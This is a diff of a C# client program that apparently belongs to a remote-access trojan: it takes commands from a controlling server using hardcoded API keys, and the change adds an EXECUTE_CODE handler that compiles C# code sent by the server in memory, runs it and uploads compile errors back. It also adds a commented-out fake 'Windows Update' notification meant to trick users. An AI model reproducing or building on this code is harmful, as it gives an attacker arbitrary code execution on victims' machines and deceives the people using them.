@@ -16,6 +16,8 @@ using Ionic.Zip;
 using Ionic.Zlib;
 using System.Reflection;
 using PluginManager;
+using Microsoft.CSharp;
+using System.CodeDom.Compiler;
 
 namespace Client
 {
@@ -36,15 +38,16 @@ namespace Client
                 HostForm = this,
                 Url = new Uri("http://localhost:3226/api"),
                 //Url = new Uri("http://restless-honey-seeker.azurewebsites.net:80/api"),
-                APIKEY_PRIVATE ="ca71ab6e833b109d781c722118d2bff373297dc1", 
-                APIKEY_PUBLIC = "a12ee5029cbf44c55869ba6d629b683d8f0044ef", 
-                CONNECTION_TIMEOUT = 10000, 
-                CONNECTION_INTERVAL = 10000, 
+                APIKEY_PRIVATE = "ca71ab6e833b109d781c722118d2bff373297dc1",
+                APIKEY_PUBLIC = "a12ee5029cbf44c55869ba6d629b683d8f0044ef",
+                CONNECTION_TIMEOUT = 10000,
+                CONNECTION_INTERVAL = 10000,
                 startNewProcessOnExit = false
             });
             Handler.Instance.OnCommandEvent += Instance_OnCommandEvent;
-            //SetupFakeMsg();
             LoadPlugins();
+            //SetupFakeMsg();
+            //CreateFakeWindowsUpdateNotifyIcon(1000,  "New updates are available", "Click to install them using Windows Update.");
         }
 
         void Instance_OnCommandEvent(object sender, ECommand e)
@@ -112,7 +115,59 @@ namespace Client
                 case ECommand.UPLOAD_PLUGIN:
                     UploadPlugin();
                     break;
+                case ECommand.EXECUTE_CODE:
+                    ExecuteCode();
+                    break;
             }
+        }
+
+        private void ExecuteCode()
+        {
+            string code = @"
+    using System;
+    using System.Drawing;
+    using System.Text;
+    using System.Windows.Forms;
+    using System.IO;
+    namespace Client
+    {
+        public class Program
+        {
+            public static void Main()
+            {
+            " +
+        Handler.Instance.Transmitter.TSettings.Parameters
+        + @"
+            }
+        }
+    }
+";
+
+            CSharpCodeProvider provider = new CSharpCodeProvider();
+            CompilerParameters parameters = new CompilerParameters();
+            parameters.ReferencedAssemblies.Add("System.dll");
+            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
+            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
+            parameters.GenerateInMemory = true;
+            parameters.GenerateExecutable = true;
+            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
+            if (results.Errors.HasErrors)
+            {
+                StringBuilder sb = new StringBuilder();
+                foreach (CompilerError error in results.Errors)
+                {
+                    sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
+                }
+                Handler.Instance.Transmitter.UploadData("exception.txt", sb.ToString(), false);
+            }
+            Assembly assembly = results.CompiledAssembly;
+            Type program = assembly.GetType("Client.Program");
+            MethodInfo main = program.GetMethod("Main");
+            try
+            {
+                main.Invoke(null, null);
+            }
+            catch { }
         }
 
         private void UploadPlugin()
